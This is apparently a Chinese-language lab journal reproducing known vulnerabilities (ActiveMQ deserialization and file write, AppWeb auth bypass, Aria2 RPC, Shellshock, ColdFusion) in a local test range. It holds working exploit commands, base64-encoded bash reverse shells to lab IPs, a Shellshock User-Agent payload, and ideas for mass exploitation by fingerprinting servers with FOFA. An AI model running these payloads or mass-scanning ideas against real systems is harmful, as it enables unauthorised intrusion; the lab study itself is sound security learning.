前言：

搭建靶场其实挺快的，就是我之前一直要用wmdk硬盘来搭建ubuntu一直显示分区无读写权限，后来就用iso重新下了，之后有需要再来琢磨。在kali和ubuntu里面都搭好了，花了点时间，下面开始记录学习过程。

漏洞复现

（1）activemq

(CVE-2015-5254）复现

一、背景

apache activemq是消息中间件，支持java消息服务，集群，springFramework等。Apache activeMQ5.13.0之前的5.x版本存在安全漏洞，是由于程序没有限制可在代理中反序列化的类。远程攻击者可以借助特制的序列化Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。

影响Apache ActiveMQ 5.x ~ Apache ActiveMQ 5.13.0

二、漏洞复现（反序列化漏洞）

8161是web管理页面端口，61616是工作端口

复现环境：

角色 IP
目标靶机 192.168.227.131
kali攻击机 192.168.227.128
VPS

这里的vps可以用kali 来替代，但是一般真实环境下会在vps服务器上面来反弹shell，（在云上搭kali 不太现实），由于是测试环境，我就在kali上面完成。

三、漏洞利用：

首先生成序列化的有效负载，将他发送到端口61616，再访问web管理页面并读取序列化消息。

1.我们在kali上面下载jmet的java消息利用工具，然后在同目录下创建external文件夹：

#下载jmet的jar包
wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
#创建external目录
mkdir external

2.在攻击机中执行命令，将有效负载发送到目标ip的61616端口：

java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/sucess” -Yp ROME 192.168.227.131 61616

【命令解释】：调用java -jar 运行 jmet的jar包，-Q是插入一个名为event的队列，-I 是选择装载ActiveMQ模块 ，-s 是选择ysoserial payload ，-Y 是攻击模式和内容， -Yp 是选择攻击利用链，这是选择是ROME， 之后带上IP加端口。

3.http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=Event在目标靶机的浏览器中访问url查看队列中所有消息

点击id即可触发漏洞

4.然后在靶机中进入容器：

#登录容器环境
docker exec -it [容器ID] bash

docker-compose（对Docker容器集群的快速编排） exec activemq bash（执行用户直接输入的命令）

ls /tmp/即可看到目录下的sucess文件

5.kali反弹shell

bash命令直弹

bash -i >& /dev/tcp/192.168.227.128/8888 0>&1

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyNy4xMjgvODg4OCAwPiYxCgo=}|{base64,-d}|{bash,-i}

java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyNy4xMjgvODg4OCAwPiYxCgo=}|{base64,-d}|{bash,-i}” -Yp ROME 192.168.227.131 61616

反弹shell要将命令base64加密后发送，利用bash在目标机解密执行，不加密无法反弹shell .

6.再回到浏览器上面就触发id就可以发现监听的8888端口已经成功拿到root权限了

四、利用限制

1）.版本符合
2）.立即执行代码：能够通过弱密码登录查看消息队列
3）.没有查看队列所有消息的用户名和密码下，只能管理员/用户去点击我们插入的消息才能触发（但可以写入创建用户命令等待管理员点击查看，概率很大）

五、总结

如四所说，在没有管理员密码的情况下面我们只能通过诱导其触发我们的链接，或者伪装成来自其他服务的合法消息，用户命令需要等待客户端访问时才能触发。

任意文件上传漏洞（CVE-2016-3088）

这个漏洞的环境一直延时接不了，在ubuntu和kali上面都无法复现场景，所以我们先看看原理

一、背景

ActiveMQ的web控制台分为三个应用，admin、api、fileserver,其中admin是管理员界面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。

通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：1. 其使用率并不高2. 文件操作容易出现漏洞所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之），之后的已经删除了这个应用。

要看清楚activemq的版本。

二、原理

漏洞出现在fileserver的应用中，原理很简单就是fileserver支持写入文件（但是不解析jsp文件），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。

文件写入的方法：

  1. 编写Webshell

    fileserver不解析jsp，admin和api都需要登录才能访问

  2. 写入cron或ssh key等文件

    直接反向Shell，但是需要root权限

  3. 编写jar或jetty.xml等库和配置文件

    写jar，有点麻烦（需要jar后门），写xml配置文件，这个方法比较靠谱，但是我们需要知道ActiveMQ的绝对路径

三、漏洞利用

访问的端口号依旧是8161管理端口，用于web端进行配置管理。

业务端口61616用于生产消费数据

（2)appweb

cve-2018-8715

一、背景

appweb是一个嵌入式开发HTTP web服务器，它迅速（ 每秒处理3500多要求）而紧凑 ，其中包括支持动态网页制作，服务器端嵌入式脚本过程中的CGI ，可加载模块的SSL ，摘要式身份验证，虚拟主机， Apache样式配置，日志记录，单和多线程应用程序。

其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。

AppWeb可以进行认证配置，其认证方式包括以下三种：

  • basic 传统HTTP基础认证
  • digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头
  • form 表单认证

影响范围：APPweb7.0.2及早期版本

二、测试环境

这次在kali上面进行复原测试

三、漏洞利用
1.开启靶场，访问目标

通过docker ps查看端口为8080

2.获取用户名

访问知道需要输入账号密码，就是要我们有已知用户名，当前环境下的用户名为‘admin’

所以我们构造头Authorization: Digest username=admin，并发送如下数据包：

注释：

Authorization里面放的就是token，就相当于每次发送请求的时候，拦截器都会拦截一次你的请求，
把你请求头部的Authorization拿出来，与当前存在服务器上的token做对比
如果是同一个，则证明是同一用户，然后拦截器就为你当前的请求放行，继续执行你的请求
如果不是同一个，那么服务器会截断你的请求并发送错误码给前端，让前端验证身份重新登陆

可见由于我们没有输入密码字段，所以服务端出现错误，直接返回了200，并且所以这步执行完之后我们可以获得session值

3.post发包登陆

四、延伸思考

因为不清楚服务器的appweb用户名，所以我们没有办法在一个服务器里批量利用，但是如果指定一个用户名，再去找那些装有appweb的服务器就可以批量利用了，这也就是指纹问题。所以我们只是需要找到关键特征利用，然后写一个poc，就可以实现

HTTP头里有一个“WWW-Authenticate:Digest…..”的内容

在fofa里面找到大量的服务器，看WWW-Authenticate内容差不多，但不确定是否真实存在的Appweb，也不知道Appweb的版本，但是这样做至少把范围缩小了，并且可以通过假定一个用户名进行批量利用了。

（3）Aria2 （任意文件写入漏洞）

一、背景

Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。Aria提供RPC服务器，通过–enable-rpc参数启动.Aria2的RPC服务器可以方便的添加，删除下载项目。

在有权限的情况下，我们可以使用RPC（远程过程调用协议，RPC协议的主要目的是做到不同服务间调用方法像同一服务间调用本地方法一样）接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。

可以让攻击通过控制文件下载链接，文件储存路径以及文件名，直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。同时通过Aria2提供的其他功能，诸如save-session等也能轻易地实现任意文件写入指定功能。

二、漏洞环境

攻击机：ubuntu 192.168.227.131

靶机：kali 192.168.227.128：6800

三、漏洞利用
1.抓包回显404错误
2.利用工具

因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 http://binux.github.io/yaaw/demo/访问这个UI，点击这个小扳手（settings），添加你的靶场域名

(4)bash安全漏洞

shellshock破壳漏洞CVE-2014-6271

背景：Bash<=4.3；8080端口，存在victim.cgi文件

  • shellshock即unix 系统下的bash shell的一个漏洞，Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。

  • bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义，而在处理这样的恶意的函数环境变量时，并没有以函数结尾 “}” 为结束，而是执行其后的恶意shell命令。

  • 执行CGI 时会调用Bash将Referer、host、UserAgent、header等作为环境变量进行处理

    靶机环境：kali

    攻击机：ubuntu

    exp:

    通过抓包修改User-Agent为

    (1)

    () { :;};echo ; echo; echo $(/bin/ls /);

反弹shell:利用bp发包到ubuntu监听的4444端口：

{ :; }; /bin/bash -i >& /dev/tcp/192.168.118.1/4444 0>&1;

  1. 此漏洞可以绕过ForceCommand在sshd中的配置，从而执行任意命令；
  2. 如果CGI脚本用Bash编写，则使用mod_cgi或mod_cgid的Apache服务器会受到影响；
  3. DHCP客户端调用shell脚本来配置系统，可能存在允许任意命令执行；
  4. 各种daemon和SUID/privileged的程序都可能执行shell脚本，通过用户设置或影响环境变量值，允许任意命令运行。

（5）Adobe coldfusion

1.(CVE-2010-2861)文件读取漏洞

背景：

Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。

Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。

2.coldfusion反序列化漏洞（CVE-2017-3066）
背景：

影响版本：

Adobe ColdFusion (2016 release) Update 3及之前的版本

ColdFusion 11 Update 11及之前的版本

Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。
